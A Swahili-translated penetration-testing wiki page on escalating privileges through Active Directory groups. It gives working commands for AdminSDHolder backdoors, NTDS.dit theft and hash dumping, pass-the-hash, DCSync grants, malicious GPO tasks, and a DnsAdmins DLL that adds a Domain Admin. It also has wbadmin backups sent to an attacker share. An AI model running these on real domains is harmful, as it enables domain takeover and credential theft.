# Vikundi Vyenye Haki za Juu

{{#include ../../banners/hacktricks-training.md}}

## Vikundi Vinavyojulikana vyenye Haki za Usimamizi

- **Administrators**
- **Domain Admins**
- **Enterprise Admins**

## Account Operators

Kikundi hiki kimepewa mamlaka ya kuunda akaunti na vikundi ambavyo si wasimamizi kwenye domain. Pia, kinawezesha kuingia kwenye Domain Controller (DC) kupitia akaunti ya ndani.

Ili kutambua wanachama wa kikundi hiki, amri ifuatayo inatekelezwa:

```bash
Get-NetGroupMember -Identity "Account Operators" -Recurse
```

Kuongeza watumiaji wapya kunaruhusiwa, pamoja na kuingia kwenye DC.<sup>[[1]](#references)</sup>

Njia yenye masharti kutoka kwenye usimamizi wa akaunti hadi kupata ufikiaji wa local administrator ni **kundi la kawaida lililokabidhiwa kusoma nenosiri la LAPS la kompyuta**. Kagua haki zinazotumika za kuandika uanachama kwenye kundi hilo mahususi, kama limelindwa, na kama akaunti mpya au inayodhibitiwa inaweza kweli kujiunga nalo. Onyesha upya tokeni ya akaunti kabla ya kujaribu ruhusa ya kusoma LAPS kwenye kompyuta lengwa. Kwa Windows LAPS iliyosimbwa kwa njia fiche, ruhusa ya kusoma kwenye directory na mamlaka ya kusimbua nenosiri ni mahitaji tofauti; uanachama wa kundi au uanachama wa Account Operators pekee hautimizi mojawapo ya mahitaji hayo. Tazama [wigo wa Account Operators wa Microsoft](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups) na [ukabidhi wa Windows LAPS](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-scenarios-windows-server-active-directory).

## Kundi la AdminSDHolder

Access Control List (ACL) ya kundi la **AdminSDHolder** ni muhimu kwa sababu huweka ruhusa za "makundi yaliyolindwa" yote ndani ya Active Directory, yakiwemo makundi yenye mapendeleo ya juu. Utaratibu huu huhakikisha usalama wa makundi haya kwa kuzuia marekebisho yasiyoidhinishwa.

Mshambulizi anaweza kutumia hili vibaya kwa kurekebisha ACL ya kundi la **AdminSDHolder** na kumpa mtumiaji wa kawaida ruhusa kamili. Hili lingempa mtumiaji huyo udhibiti kamili juu ya makundi yote yaliyolindwa. Ruhusa za mtumiaji huyu zikibadilishwa au kuondolewa, zingerudishwa kiotomatiki ndani ya saa moja kutokana na muundo wa mfumo.<sup>[[14]](#references)</sup>

Nyaraka za hivi karibuni za Windows Server bado zinachukulia makundi kadhaa ya waendeshaji yaliyojengewa ndani kama vitu **vilivyolindwa** (`Account Operators`, `Backup Operators`, `Print Operators`, `Server Operators`, `Domain Admins`, `Enterprise Admins`, `Key Admins`, `Enterprise Key Admins`, n.k.). Mchakato wa **SDProp** huendeshwa kwenye **PDC Emulator** kila baada ya dakika 60 kwa chaguomsingi, huweka `adminCount=1`, na huzima urithishaji kwenye vitu vilivyolindwa. Hili ni muhimu kwa kudumisha ufikiaji na pia kutafuta watumiaji wa zamani wenye mapendeleo walioondolewa kwenye kundi lililolindwa lakini bado wana ACL isiyorithi ruhusa.<sup>[[12]](#references)</sup>

Amri za kukagua wanachama na kurekebisha ruhusa ni pamoja na:

```bash
Get-NetGroupMember -Identity "AdminSDHolder" -Recurse
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'spotless'}
```

```powershell
# Hunt users/groups that still have adminCount=1
Get-ADObject -LDAPFilter '(adminCount=1)' -Properties adminCount,distinguishedName |
  Select-Object distinguishedName
```

Scripti inapatikana ili kuharakisha mchakato wa kurejesha: [Invoke-ADSDPropagation.ps1](https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1).

Kwa maelezo zaidi, tembelea [ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence).<sup>[[14]](#references)</sup>

## AD Recycle Bin

Uonekano wa object zilizofutwa hudhibitiwa na ruhusa za directory zinazotumika; jina la group pekee halithibitishi kwamba identity ya sasa inaweza kuorodhesha au kurejesha object. AD Recycle Bin lazima iwe imewezeshwa kabla ya kufutwa ili kurejesha object kikamilifu, na urejeshaji pia unahitaji Reanimate-Tombstones kwenye root ya naming-context, ruhusa za kubadilisha jina, na CREATE_CHILD kwenye container lengwa. [Mwongozo wa Microsoft kuhusu Recycle Bin](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/get-started/adac/active-directory-recycle-bin) na [kanuni za uidhinishaji wa undelete](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/c7279698-8aed-4e0b-b750-97c29f11b004) zinafafanua masharti haya. Identity iliyoidhinishwa yenye ruhusa ya kusoma object zilizofutwa inaweza kukagua rekodi zinazoweza kufichua taarifa nyeti:

```bash
Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
```

Hii ni muhimu kwa **kutambua upya njia za awali za kupata mamlaka**. Vipengee vilivyofutwa bado vinaweza kufichua `lastKnownParent`, `memberOf`, `sIDHistory`, `adminCount`, SPN za zamani, au DN ya kikundi cha mamlaka kilichofutwa ambacho baadaye kinaweza kurejeshwa na operator mwingine.

Sifa zilizofafanuliwa na programu zinaweza pia kuhifadhi taarifa za zamani za uthibitishaji wakati kipengee bado kiko katika hali ya kufutwa. Chukulia hili kama kidokezo tofauti cha ukaguzi: utambulisho wa sasa lazima uruhusiwe kuorodhesha kipengee kilichofutwa **na** kusoma sifa hiyo, thamani lazima iwe taarifa za uthibitishaji zinazoweza kutumika, na principal ambayo bado inatumika lazima izikubali. Uanachama wa kikundi au jina la akaunti iliyofutwa pekee havithibitishi hatua hizo; epuka kuchapisha thamani za taarifa za uthibitishaji wakati wa uorodheshaji wa kawaida. [Nyaraka za Microsoft kuhusu Recycle Bin](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/get-started/adac/active-directory-recycle-bin) zinaeleza uhifadhi wa sifa baada ya kufutwa.

```powershell
Get-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects `
  -Properties samAccountName,lastKnownParent,memberOf,sIDHistory,adminCount,servicePrincipalName |
  Select-Object samAccountName,lastKnownParent,adminCount,sIDHistory,servicePrincipalName
```

### Kufufua akaunti iliyofutwa kupitia ACL zilizokabidhiwa

Matokeo ya `WRITE` ya zana ya ACL kwa akaunti iliyofutwa ni kidokezo, si uthibitisho kwamba ruhusa zote za kurejesha akaunti iliyofutwa zinafanya kazi.<sup>[[18]](#references)</sup> Kagua ACL ya kitu kilichofutwa na `lastKnownParent` moja kwa moja; njia za BloodHound huenda zisionyeshe ACL za vitu vilivyofutwa.<sup>[[19]](#references)</sup> Akaunti iliyorejeshwa inaweza kuhifadhi hash ya nenosiri lake, lakini kuirejesha hakufichui nenosiri wala hakutoi haki za kulibadilisha. Uthibitishaji bado unahitaji kitambulisho halali.<sup>[[19]](#references)</sup>

Ili kuorodhesha akaunti zilizofutwa zilizofichwa na kuthibitisha haki ya kuzifufua kutoka Linux, tumia `bloodyAD` pamoja na vidhibiti vya LDAP vya recycled-object na deactivated-link. Kisha rejesha akaunti uliyochagua kwa kutumia `sAMAccountName` yake. Badilisha domain, host na utambulisho wa mfano kwa maelezo ya mazingira yaliyotathminiwa; thibitisha DN lengwa na `lastKnownParent` kabla ya kuandika mabadiliko.<sup>[[19]](#references)</sup>

```bash
bloodyAD --host dc.example.local -d example.local -u operator -p 'PASSWORD' get writable
bloodyAD --host dc.example.local -d example.local -u operator -p 'PASSWORD' get object 'DC=example,DC=local' --attr nTSecurityDescriptor --resolve-sd | grep -i Reanimate-Tombstones
bloodyAD --host dc.example.local -d example.local -u operator -p 'PASSWORD' get search -c 1.2.840.113556.1.4.2064 -c 1.2.840.113556.1.4.2065 --base 'CN=Deleted Objects,DC=example,DC=local' --filter '(sAMAccountName=*)' --attr sAMAccountName,lastKnownParent,objectSid
bloodyAD --host dc.example.local -d example.local -u operator -p 'PASSWORD' set restore target.user
```

### Ufikiaji wa Domain Controller

Ufikiaji wa faili kwenye DC umezuiwa isipokuwa mtumiaji awe sehemu ya kundi la `Server Operators`, jambo linalobadilisha kiwango cha ufikiaji.

### Privilege Escalation

Kwa kutumia `PsService` au `sc` kutoka Sysinternals, mtu anaweza kukagua na kurekebisha ruhusa za huduma. Kwa mfano, kundi la `Server Operators` lina udhibiti kamili wa baadhi ya huduma, hivyo kuruhusu utekelezaji wa amri zozote na kupandisha marupurupu:<sup>[[1]](#references)</sup>

```cmd
C:\> .\PsService.exe security AppReadiness
```

Amri hii inaonyesha kuwa `Server Operators` wana ufikiaji kamili, unaowezesha kubadilisha services ili kupata haki za juu.

## Backup Operators

Uanachama katika `Backup Operators` unaweza kutoa `SeBackupPrivilege` na `SeRestorePrivilege` kwenye host, kutegemea sera yake ya ndani na logon session. Kagua **token inayotumika ya process inayoendesha amri** kwa kutumia `whoami /groups` na `whoami /priv`: uanachama pekee hauthibitishi kuwa `SeBackupPrivilege` ipo na imewashwa. Ikiwa privilege ipo lakini imezimwa, inaweza kuwashwa ndani ya token hiyo; ikiwa haipo au imeondolewa, shughuli hizi za backup haziwezi kuitumia. `SeBackupPrivilege` huruhusu **kusoma** data iliyolindwa kupitia APIs zinazotambua backup (kwa mfano, `FILE_FLAG_BACKUP_SEMANTICS` au `robocopy /B`); `SeRestorePrivilege` ni privilege tofauti ya shughuli za kurejesha/kuandika. Orodhesho za kawaida za saraka na kunakili faili si lazima zitumie backup semantics.<sup>[[1]](#references)</sup>

Ili kuorodhesha wanachama wa kikundi, tekeleza:

```bash
Get-NetGroupMember -Identity "Backup Operators" -Recurse
```

### Shambulio la Ndani

Kwenye host ambapo token inayotumika ina `SeBackupPrivilege`, nakala inayozingatia backup inaweza kusoma faili iliyolindwa:

1. Ingiza maktaba zinazohitajika:

```bash
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
```

2. Ikiwa ruhusa ipo lakini imezimwa, iwezeshe na uthibitishe hali yake katika mchakato huu:

```bash
Set-SeBackupPrivilege
Get-SeBackupPrivilege
```

3. Nakili faili kutoka kwenye saraka yenye vizuizi, kwa mfano:

```bash
dir C:\Users\Administrator\
Copy-FileSeBackupPrivilege C:\Users\Administrator\report.pdf c:\temp\x.pdf -Overwrite
```

### AD Attack

`NTDS.dit` ni hifadhidata ya Active Directory kwenye **domain controller (DC)**. Njia hii inahitaji tokeni inayofaa kwenye DC na ufikiaji wa volume iliyo na hifadhidata; uanachama wa Backup Operators mahali pengine hautoi ufikiaji wa DC fulani. Hifadhidata inayotumika kwa kawaida huwa imefungwa, kwa hivyo tumia shadow copy inayoweza kufikiwa au kituo kingine cha kuhifadhi nakala kabla ya kuinakili. Kuunda au kuweka wazi shadow copy pia hutegemea usanidi wa VSS wa host na ruhusa za mtumiaji anayeitekeleza. Mfano ulio hapa chini unadhania kuwa DC huhifadhi `NTDS.dit` kwenye `C:` chini ya `\Windows\NTDS`; rekebisha volume na njia ikiwa sivyo.

#### Using diskshadow.exe

1. Ikiwa inaruhusiwa, unda na uweke wazi shadow copy ya drive ya `C:` ya DC kama `F:`:

```cmd
diskshadow.exe
set verbose on
set metadata C:\Windows\Temp\meta.cab
set context clientaccessible
begin backup
add volume C: alias cdrive
create
expose %cdrive% F:
end backup
exit
```

2. Nakili `NTDS.dit` kutoka kwenye nakala kivuli:

```cmd
mkdir C:\Tools
Copy-FileSeBackupPrivilege F:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
```

Vinginevyo, tumia `robocopy` kunakili faili:

```cmd
robocopy /B F:\Windows\NTDS C:\Tools ntds.dit
```

3. Hifadhi hive ya `SYSTEM` ya DC kwa ajili ya extraction ya offline. `SAM` ni database ya akaunti za ndani kwenye mifumo ya wanachama; hive ya `SAM` ya DC si mbadala wa `NTDS.dit` wala chanzo cha hash ya Administrator wa domain:

```cmd
reg save HKLM\SYSTEM C:\Tools\SYSTEM.SAV
```

4. Hamisha `ntds.dit` na `SYSTEM.SAV` hadi kwenye host ya uchanganuzi na utoe hashes za akaunti za domain. Hive ya `SAM` iliyohifadhiwa kutoka kwenye mfumo mwanachama, pamoja na hive yake inayolingana ya `SYSTEM`, hutoa hashes za akaunti za ndani badala yake:

```shell-session
secretsdump.py -ntds ntds.dit -system SYSTEM.SAV LOCAL
```

5. Ikiwa hash ya Msimamizi wa **kikoa** ilipatikana kutoka `NTDS.dit`, inaweza kujaribiwa kwa uthibitishaji wa kikoa. Hash ya Msimamizi wa ndani kutoka `SAM.SAV` ni kitambulisho tofauti na haiwezi kuthibitisha utambulisho kama Msimamizi wa kikoa.<sup>[[11]](#references)</sup>

```bash
# Use the recovered domain Administrator NT hash to authenticate without the cleartext password
netexec winrm <DC_FQDN> -d <DOMAIN> -u Administrator -H <ADMIN_NT_HASH> -x "whoami"

# Or execute via SMB using an exec method
netexec smb <DC_FQDN> -d <DOMAIN> -u Administrator -H <ADMIN_NT_HASH> --exec-method smbexec -x cmd
```

#### Kutumia wbadmin.exe

1. Sanidi mfumo wa faili wa NTFS kwa seva ya SMB kwenye mashine ya mshambuliaji, kisha uhifadhi akiba ya SMB credentials kwenye mashine lengwa.
2. Tumia `wbadmin.exe` kufanya backup ya mfumo na kutoa `NTDS.dit`:
   ```cmd
   net use X: \\<AttackIP>\sharename /user:smbuser password
   echo "Y" | wbadmin start backup -backuptarget:\\<AttackIP>\sharename -include:c:\windows\ntds
   wbadmin get versions
   echo "Y" | wbadmin start recovery -version:<date-time> -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:C:\ -notrestoreacl
   ```

Kwa onyesho la vitendo, tazama [DEMO VIDEO WITH IPPSEC](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610s).

## DnsAdmins

Wanachama wa kikundi cha **DnsAdmins** wanaweza kutumia vibaya ruhusa zao kupakia DLL yoyote yenye ruhusa za SYSTEM kwenye seva ya DNS, ambayo mara nyingi huwekwa kwenye Domain Controllers. Uwezo huu hutoa fursa kubwa za unyonyaji.

Ili kuorodhesha wanachama wa kikundi cha DnsAdmins, tumia:

```bash
Get-NetGroupMember -Identity "DnsAdmins" -Recurse
```

### Tekeleza DLL yoyote (CVE‑2021‑40469)

> [!NOTE]
> Athari hii huruhusu kutekelezwa kwa msimbo wowote wenye haki za SYSTEM katika huduma ya DNS (kwa kawaida ndani ya DCs). Tatizo hili lilirekebishwa mwaka wa 2021.

Wanachama wanaweza kufanya seva ya DNS ipakie DLL yoyote (iwe kutoka kwenye mfumo wa ndani au share ya mbali) kwa kutumia amri kama vile:

```bash
dnscmd [dc.computername] /config /serverlevelplugindll c:\path\to\DNSAdmin-DLL.dll
dnscmd [dc.computername] /config /serverlevelplugindll \\1.2.3.4\share\DNSAdmin-DLL.dll
An attacker could modify the DLL to add a user to the Domain Admins group or execute other commands with SYSTEM privileges. Example DLL modification and msfvenom usage:

# If dnscmd is not installed run from aprivileged PowerShell session:
Install-WindowsFeature -Name RSAT-DNS-Server -IncludeManagementTools
```

```c
// Modify DLL to add user
DWORD WINAPI DnsPluginInitialize(PVOID pDnsAllocateFunction, PVOID pDnsFreeFunction)
{
    system("C:\\Windows\\System32\\net.exe user Hacker T0T4llyrAndOm... /add /domain");
    system("C:\\Windows\\System32\\net.exe group \"Domain Admins\" Hacker /add /domain");
}
```

```bash
// Generate DLL with msfvenom
msfvenom -p windows/x64/exec cmd='net group "domain admins" <username> /add /domain' -f dll -o adduser.dll
```

Kuanzisha upya huduma ya DNS (ambayo inaweza kuhitaji ruhusa za ziada) ni muhimu ili DLL ipakie:

```csharp
sc.exe \\dc01 stop dns
sc.exe \\dc01 start dns
```

Kwa maelezo zaidi kuhusu njia hii ya shambulio, rejelea ired.team.

#### Mimilib.dll

Inawezekana pia kutumia mimilib.dll kwa kutekeleza amri, kwa kuirekebisha ili itekeleze amri maalum au reverse shells. [Angalia chapisho hili](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html) kwa maelezo zaidi.<sup>[[15]](#references)</sup>

### Rekodi ya WPAD kwa MitM

DnsAdmins wanaweza kubadilisha rekodi za DNS ili kufanya mashambulizi ya Man-in-the-Middle (MitM) kwa kuunda rekodi ya WPAD baada ya kuzima orodha ya kimataifa ya vizuizi vya maswali. Zana kama Responder au Inveigh zinaweza kutumiwa kufanya spoofing na kunasa trafiki ya mtandao.

### Event Log Readers
Wanachama wanaweza kufikia logu za matukio na huenda wakapata taarifa nyeti kama vile nywila za maandishi wazi au maelezo ya utekelezaji wa amri:

```bash
# Get members and search logs for sensitive information
Get-NetGroupMember -Identity "Event Log Readers" -Recurse
Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'}
```

## Ruhusa za Exchange Windows

Kikundi hiki kinaweza kurekebisha DACL kwenye object ya domain, na hivyo huenda kikatoa ruhusa za DCSync. Mbinu za privilege escalation zinazotumia kikundi hiki zimefafanuliwa kwa kina katika repo ya Exchange-AD-Privesc GitHub.

```bash
# List members
Get-NetGroupMember -Identity "Exchange Windows Permissions" -Recurse
```

Ikiwa unaweza kutenda kama mwanachama wa kundi hili, matumizi mabaya ya kawaida ni kumpa principal inayodhibitiwa na mshambuliaji haki za replication zinazohitajika kwa [DCSync](dcsync.md):

```bash
Add-DomainObjectAcl -TargetIdentity "DC=testlab,DC=local" -PrincipalIdentity attacker -Rights DCSync
Get-ObjectAcl -DistinguishedName "DC=testlab,DC=local" -ResolveGUIDs | ?{$_.IdentityReference -match 'attacker'}
```

Kihistoria, **PrivExchange** iliunganisha ufikiaji wa mailbox, kulazimisha uthibitishaji wa Exchange, na LDAP relay ili kupata primitive hii hii. Hata pale ambapo njia hiyo ya relay imezuiwa, kuwa mwanachama wa moja kwa moja wa `Exchange Windows Permissions` au kudhibiti server ya Exchange bado ni njia yenye thamani kubwa ya kupata haki za replication ya domain.

## Hyper-V Administrators

Hyper-V Administrators wana ufikiaji kamili wa Hyper-V, ambao unaweza kutumiwa kupata udhibiti wa Domain Controllers zilizowekwa kwenye mashine pepe. Hii inajumuisha ku-clone DC zilizo hai na kutoa NTLM hashes kutoka kwenye faili ya NTDS.dit.

### Mfano wa Unyonyaji

Matumizi mabaya ya vitendo kwa kawaida huhusisha **ufikiaji wa offline wa diski/checkpoint za DC** badala ya mbinu za zamani za LPE kwenye host. Akiwa na ufikiaji wa host ya Hyper-V, operator anaweza kuunda checkpoint au ku-export Domain Controller iliyowekwa kwenye mashine pepe, ku-mount VHDX, na kutoa `NTDS.dit`, `SYSTEM`, na siri nyingine bila kugusa LSASS ndani ya guest:

```bash
# Host-side enumeration
Get-VM
Get-VHD -VMId <vm-guid>

# After exporting or checkpointing the DC, mount the disk read-only
Mount-VHD -Path 'C:\HyperV\Virtual Hard Disks\DC01.vhdx' -ReadOnly
```

Kuanzia hapo, tumia tena workflow ya `Backup Operators` ili kunakili `Windows\NTDS\ntds.dit` na registry hives ukiwa offline. Workflow inayohusiana ya faili za backup:

{{#ref}}
../../network-services-pentesting/pentesting-veeam-backup-and-replication.md
{{#endref}}

## Group Policy Creators Owners	

Kikundi hiki huruhusu wanachama kuunda Group Policies kwenye domain. Hata hivyo, wanachama wake hawawezi kutumia group policies kwa users au groups, wala kuhariri GPO zilizopo.

Jambo muhimu ni kwamba **mtayarishaji anakuwa mmiliki wa GPO mpya** na kwa kawaida hupata haki za kutosha za kuihariri baadaye. Hiyo inamaanisha kikundi hiki ni cha kuvutia unapoweza:

- kuunda GPO hasidi na kumshawishi admin kuiunganisha na OU/domain lengwa
- kuhariri GPO uliyounda ambayo tayari imeunganishwa mahali panapofaa
- kutumia vibaya haki nyingine iliyokabidhiwa inayokuruhusu kuunganisha GPO, huku kikundi hiki kikikupa uwezo wa kuihariri

Kwa kawaida, matumizi mabaya ya vitendo huhusisha kuongeza **Immediate Task**, **startup script**, **local admin membership**, au mabadiliko ya **user rights assignment** kupitia faili za sera zinazotegemea SYSVOL.<sup>[[3]](#references)[[4]](#references)[[13]](#references)[[16]](#references)</sup>

```bash
# Example with SharpGPOAbuse: add an immediate task that executes as SYSTEM
SharpGPOAbuse.exe --AddImmediateTask --TaskName "HT-Task" --Author TESTLAB\\Administrator --Command "cmd.exe" --Arguments "/c whoami > C:\\Windows\\Temp\\gpo.txt" --GPOName "Security Update"
```

Ikiwa unahariri GPO mwenyewe kupitia `SYSVOL`, kumbuka kuwa mabadiliko pekee hayatoshi: `versionNumber`, `GPT.ini`, na wakati mwingine `gPCMachineExtensionNames` lazima pia zisasisishwe, la sivyo wateja watapuuza uonyeshaji upya wa policy.<sup>[[9]](#references)</sup>

## Organization Management

Katika mazingira ambako **Microsoft Exchange** imesakinishwa, kuna kundi maalum linalojulikana kama **Organization Management** lenye uwezo mkubwa. Kundi hili lina ruhusa ya **kufikia mailbox za watumiaji wote wa domain** na lina **udhibiti kamili wa** Organizational Unit (OU) ya **'Microsoft Exchange Security Groups'**. Udhibiti huu unajumuisha kundi la **`Exchange Windows Permissions`**, ambalo linaweza kutumiwa kuongeza privilege.

### Kutumia Vibaya Privilege na Amri

#### Print Operators

Wanachama wa kundi la **Print Operators** wana privilege kadhaa, zikiwemo **`SeLoadDriverPrivilege`**, inayowaruhusu **kuingia ndani ya Domain Controller**, kuizima na kudhibiti printers. Ili kutumia vibaya privilege hizi, hasa ikiwa **`SeLoadDriverPrivilege`** haionekani kwenye mazingira yasiyo na privilege zilizoinuliwa, ni muhimu kukwepa User Account Control (UAC).<sup>[[1]](#references)</sup>

Ili kuorodhesha wanachama wa kundi hili, tumia amri ifuatayo ya PowerShell:

```bash
Get-NetGroupMember -Identity "Print Operators" -Recurse
```

Kwenye Domain Controllers, kundi hili ni hatari kwa sababu sera chaguomsingi ya Domain Controller huwapa **`SeLoadDriverPrivilege`** washiriki wa `Print Operators`. Ukipata tokeni iliyoinuliwa ya mshiriki wa kundi hili, unaweza kuwezesha haki hiyo na kupakia driver iliyosainiwa lakini iliyo hatarini ili kupata ufikiaji wa kernel/SYSTEM.<sup>[[2]](#references)[[5]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[10]](#references)[[17]](#references)</sup> Kwa maelezo kuhusu jinsi ya kushughulikia tokeni, angalia [Access Tokens](../windows-local-privilege-escalation/access-tokens.md).

#### Watumiaji wa Remote Desktop

Washiriki wa kundi hili hupewa ufikiaji wa PC kupitia Remote Desktop Protocol (RDP). Ili kuorodhesha washiriki hawa, amri za PowerShell zinapatikana:

```bash
Get-NetGroupMember -Identity "Remote Desktop Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Desktop Users"
```

Maarifa zaidi kuhusu kutumia RDP yanaweza kupatikana katika rasilimali maalum za pentesting.

#### Remote Management Users

Wanachama wanaweza kufikia PC kupitia **Windows Remote Management (WinRM)**. Enumeration ya wanachama hawa hufanywa kupitia:

```bash
Get-NetGroupMember -Identity "Remote Management Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Management Users"
```

Kwa mbinu za exploitation zinazohusiana na **WinRM**, unapaswa kushauriana na nyaraka mahususi.

#### Server Operators

Kikundi hiki kina ruhusa za kufanya usanidi mbalimbali kwenye Domain Controllers, ikijumuisha ruhusa za kuhifadhi nakala na kurejesha, kubadilisha muda wa mfumo, na kuzima mfumo.<sup>[[1]](#references)</sup> Ili kuorodhesha wanachama, amri iliyotolewa ni:

```bash
Get-NetGroupMember -Identity "Server Operators" -Recurse
```

Kwenye Domain Controllers, `Server Operators` kwa kawaida hurithi haki za kutosha za **kubadilisha usanidi au kuanzisha/kusimamisha huduma** na pia hupokea `SeBackupPrivilege`/`SeRestorePrivilege` kupitia sera chaguomsingi ya DC. Kwa vitendo, hii huwafanya kuwa daraja kati ya **matumizi mabaya ya udhibiti wa huduma** na **uchimbaji wa NTDS**:

```cmd
sc.exe \\dc01 query
sc.exe \\dc01 qc <service>
.\PsService.exe security <service>
```

Kushindwa kuorodhesha services hakumaanishi kuwa hakuna ufikiaji wa **service inayojulikana**. Service Control Manager hukagua `SC_MANAGER_ENUMERATE_SERVICE` kwa ajili ya kuorodhesha kando na `SC_MANAGER_CONNECT`; kufungua service iliyotajwa hukagua ruhusa zake yenyewe, zikiwemo `SERVICE_CHANGE_CONFIG` na `SERVICE_START`. Kagua token inayotumika na ACL ya service hiyo hata kama `sc.exe query` ya jumla itashindwa. Ruhusa za kubadilisha usanidi pekee ni dalili tu: utambulisho wa service, ruhusa za kuianzisha/kusimamisha, na kichochezi kinachoweza kutumika bado ndivyo huamua kama mabadiliko ya kufikia upendeleo wa juu yanawezekana. Angalia [marejeleo ya Microsoft kuhusu haki za ufikiaji wa service](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights).

Ikiwa ACL ya service italipa kundi hili haki za kubadilisha/kuiwasha, elekeza service itekeleze amri yoyote, iwashe ikiwa `LocalSystem`, kisha urejeshe `binPath` ya awali. Ikiwa udhibiti wa service umefungwa, tumia tena mbinu za `Backup Operators` zilizo hapo juu kunakili `NTDS.dit`.

## References

- [1] [ired.team – Akaunti za Upendeleo na Haki za Tokeni](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [2] [Tarlogic – Kutumia Vibaya SeLoadDriverPrivilege kwa Kuongeza Upendeleo](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
- [3] [harmj0y – Kutumia Vibaya Ruhusa za GPO](https://blog.harmj0y.net/redteaming/abusing-gpo-permissions/)
- [4] [rastamouse – Matumizi Mabaya ya GPO, Sehemu ya 1 (Internet Archive)](https://web.archive.org/web/20190416075109/https://rastamouse.me/2019/01/gpo-abuse-part-1/)
- [5] [killswitch-GUI – HotLoad-Driver (ntloaddriver.cpp)](https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13)
- [6] [tandasat – ExploitCapcom](https://github.com/tandasat/ExploitCapcom)
- [7] [TarlogicSecurity – EoPLoadDriver (eoploaddriver.cpp)](https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp)
- [8] [FuzzySecurity – Capcom-Rootkit (Capcom.sys)](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys)
- [9] [SpecterOps – Mwongozo wa Red Teamer kuhusu GPO na OU](https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e)
- [10] [Microsoft Learn – Kazi ya ZwLoadDriver](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-zwloaddriver)
- [11] [HTB: Baby — LDAP Isiyohitaji Utambulisho → Password Spray → SeBackupPrivilege → Domain Admin](https://0xdf.gitlab.io/2025/09/19/htb-baby.html)
- [12] [Microsoft Learn – Kiambatisho C: Akaunti na Makundi Yanayolindwa katika Active Directory](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-c--protected-accounts-and-groups-in-active-directory)
- [13] [WithSecure Labs – SharpGPOAbuse](https://labs.withsecure.com/tools/sharpgpoabuse)
- [14] [ired.team – Jinsi ya Kutumia Vibaya na Kuweka Backdoor kwenye AdminSDHolder ili Kupata Uendelevu wa Domain Admin](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence)
- [15] [Lab of a Penetration Tester – Kutumia Vibaya Upendeleo wa DnsAdmins kwa Kuongeza Upendeleo katika Active Directory](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html)
- [16] [BloodHound – Taarifa kuhusu matumizi mabaya ya ukingo wa GenericAll](https://bloodhound.specterops.io/resources/edges/generic-all)
- [17] [Undocumented NT Internals – Kazi ya NtLoadDriver (Internet Archive)](https://web.archive.org/web/20200313000124/http://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html)
- [18] [MS-ADTS - Kanuni za uidhinishaji wa kurejesha vitu vilivyofutwa](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/c7279698-8aed-4e0b-b750-97c29f11b004)
- [19] [0xdf - HTB: Checkpoint](https://0xdf.gitlab.io/2026/10/24/htb-checkpoint.html)
{{#include ../../banners/hacktricks-training.md}}
